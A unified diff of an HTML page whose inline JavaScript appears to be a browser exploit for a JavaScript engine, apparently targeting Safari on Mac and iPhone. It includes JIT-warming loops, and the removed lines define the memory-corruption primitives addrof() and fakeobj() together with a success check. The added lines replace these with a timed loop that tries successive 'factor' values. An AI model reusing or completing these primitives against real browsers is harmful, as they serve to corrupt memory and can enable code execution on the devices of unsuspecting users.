@@ -8,7 +8,6 @@
     <title>Document</title>
 </head>
 <body>
-    <p id="factors"></p>
     <p id="status"></p>
     <script>
         let boxed_arr = new Function();
@@ -57,15 +56,6 @@
             for (let i = 0; i < 1e6; ++i) {
                 get_getterSetter(i % 2);
             }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
             return [getter, get_getterSetter(1)];
         }
 
@@ -102,37 +92,25 @@
             }
 
             let ref_arr = [];
-            for (let i = 0; i < factor; ++i) {
-                ref_arr.push(symbolObject.description);
-                console.log(`Testing factor: ${factor + i}`);
+            let currentFactor = 87; // Start with the smallest value
+            let maxFactor = factor + 1000; // Example max range
+            function updateStatus() {
+                document.getElementById("status").innerHTML = `Testing factor: ${currentFactor}`;
             }
-
-            getter.p13 = 1.1; 
-            let unboxed_arr = getter;
-
-            function addrof(o) {
-                boxed_arr[8] = o;
-                return Int64.fromDouble(unboxed_arr[0]);
-            }
-
-            function fakeobj(addr) {
-                unboxed_arr[0] = addr.asDouble();
-                return boxed_arr[8];
-            }
-
-            let sample = BigInt(addrof({}).toString());
-            if (sample >= 0x200000000 || sample < 0x100000000) {
-                location.reload();
-                return;
-            } else {
-                alert(`success!!!`);
-                if (unknown_device) {
-                    alert(`It seems you have found a valid factor for an untested device!\nIf you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isiPhone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
-                    document.getElementById("status").innerHTML = "Success!";
+            
+            // Sequentially testing factors
+            function nextAttempt() {
+                if (currentFactor <= maxFactor) {
+                    ref_arr.push(symbolObject.description);
+                    updateStatus();
+                    currentFactor++;
+                    setTimeout(nextAttempt, 1000); // Retry every second
+                } else {
+                    alert('Test complete or max attempts reached.');
                 }
             }
 
-            alert(addrof({}).toString());
+            nextAttempt();
         })();
     </script>
 </body>
